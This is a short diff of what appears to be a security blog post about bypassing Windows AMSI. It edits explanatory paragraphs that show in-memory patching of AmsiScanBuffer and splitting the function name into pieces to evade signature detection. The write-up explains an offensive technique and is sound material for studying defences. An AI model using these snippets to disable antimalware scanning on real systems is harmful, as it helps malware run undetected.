@@ -422,7 +422,6 @@ namespace Bypass
             Marshal.Copy(Patch, 0, unmanagedPointer, 3);
             MoveMemory(AmsiScanBufferPtr + 0x001b, unmanagedPointer, 3);
 
-            Console.WriteLine(&quot;AmsiScanBuffer patch has been applied.&quot;);
             return 0;
         }
     }
@@ -496,13 +495,11 @@ Add-Type [...]
 
 <p>Of course, this is relatively straight forward to fix.</p>
 
-<p><code>IntPtr AmsiScanBufferPtr = GetProcAddress(TargetDLL, &quot;AmsiScanBuffer&quot;);</code> becomes <code>IntPtr ASBPtr = GetProcAddress(TargetDLL, &quot;Amsi&quot; + &quot;Scan&quot; + &quot;Buffer&quot;);</code></p>
+<p><code>IntPtr AmsiScanBufferPtr = GetProcAddress(TargetDLL, &quot;AmsiScanBuffer&quot;);</code> becomes <code>IntPtr ASBPtr = GetProcAddress(TargetDLL, &quot;Amsi&quot; + &quot;Scan&quot; + &quot;Buffer&quot;);</code>.</p>
 
-<p><code>VirtualProtect(AmsiScanBufferPtr, (UIntPtr) 5, 0x40, out uint Zero);</code> becomes <code>VirtualProtect(ASBPtr, dwSize, 0x40, out Zero);</code></p>
+<p><code>VirtualProtect(AmsiScanBufferPtr, (UIntPtr) 5, 0x40, out uint Zero);</code> becomes <code>VirtualProtect(ASBPtr, dwSize, 0x40, out Zero);</code>.</p>
 
-<p><code>MoveMemory(AmsiScanBufferPtr + 0x001b, unmanagedPointer, 3);</code> becomes <code>MoveMemory(ASBPtr + 0x001b, unmanagedPointer, 3);</code></p>
-
-<p>and I will just remove <code>Console.WriteLine(&quot;AmsiScanBuffer patch has been applied.&quot;);</code>.</p>
+<p><code>MoveMemory(AmsiScanBufferPtr + 0x001b, unmanagedPointer, 3);</code> becomes <code>MoveMemory(ASBPtr + 0x001b, unmanagedPointer, 3);</code>.</p>
 
 
 <figure>
